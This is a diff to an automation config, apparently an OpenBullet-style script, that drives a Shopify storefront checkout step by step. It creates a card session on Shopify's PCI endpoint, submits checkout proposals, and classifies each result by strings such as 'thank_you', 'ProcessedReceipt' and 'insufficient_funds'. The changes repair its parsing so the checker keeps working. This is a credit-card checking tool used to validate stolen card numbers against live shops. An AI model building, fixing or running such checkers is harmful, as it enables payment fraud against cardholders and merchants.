@@ -84,9 +84,9 @@ REQUEST GET "https://<site>/products.json"
   HEADER "Accept-Language: en-US,en;q=0.9" 
   HEADER "Pragma: no-cache" 
 
-variantid PARSE "<SOURCE>" LR "\"variants\":[{\"id\":" "," CreateEmpty=FALSE -> VAR "variantid" 
+variantid PARSE "<SOURCE>" LR "\"products\":[{\"variants\":[{\"id\":" "," CreateEmpty=FALSE -> VAR "variantid" 
 
-price PARSE "<SOURCE>" LR "\"price\":\"" "\"," CreateEmpty=FALSE -> VAR "price" 
+price PARSE "<SOURCE>" LR "\"price\":\"" "\"" CreateEmpty=FALSE -> VAR "price" 
 
 # Step 2: Get site homepage to extract accessToken
 REQUEST GET "https://<site>" 
@@ -177,7 +177,7 @@ REQUEST POST "https://checkout.pci.shopifyinc.com/sessions"
   HEADER "Sec-Fetch-Site: same-origin" 
   HEADER "Pragma: no-cache" 
 
-id PARSE "<SOURCE>" LR "{\"id\":\"" "\"}" CreateEmpty=FALSE -> VAR "id" 
+id PARSE "<SOURCE>" LR "\"id\":\"" "\"" CreateEmpty=FALSE -> VAR "id" 
 
 # Step 6: First Proposal (Negotiate)
 REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=Proposal" 
@@ -290,8 +290,6 @@ REQUEST POST "https://<site>/checkouts/unstable/graphql?operationName=PollForRec
   HEADER "X-Checkout-Web-Source-Id: <tok>" 
   HEADER "Pragma: no-cache" 
 
-raw PARSE "<SOURCE>" LR "" "" -> VAR "raw" 
-
 cc_status PARSE "<SOURCE>" LR "\"code\":\"" "\"," CreateEmpty=FALSE -> CAP "cc_status" 
 
 cc_status2 PARSE "<SOURCE>" LR "\"__typename\":\"" "\"}" CreateEmpty=FALSE -> CAP "cc_status2" 
@@ -374,9 +372,9 @@ KEYCHECK BanOnToCheck=FALSE
     KEY "<cc_status3>" EqualTo "ConfirmationPage" 
     KEY "<cc_status6>" EqualTo "ORDER" 
     KEY "<cc_status2>" Contains "ProcessedReceipt" 
-    KEY "<raw>" Contains "ProcessedReceipt" 
-    KEY "<raw>" Contains "thank_you" 
-    KEY "<raw>" Contains "thank" 
+    KEY "<SOURCE>" Contains "ProcessedReceipt" 
+    KEY "<SOURCE>" Contains "thank_you" 
+    KEY "<SOURCE>" Contains "thank" 
   KEYCHAIN Custom "CUSTOM" OR 
     KEY "<cc_status2>" Contains "AUTHENTICATION_FAILED" 
     KEY "<cc_status2>" Contains "insufficient_funds" 
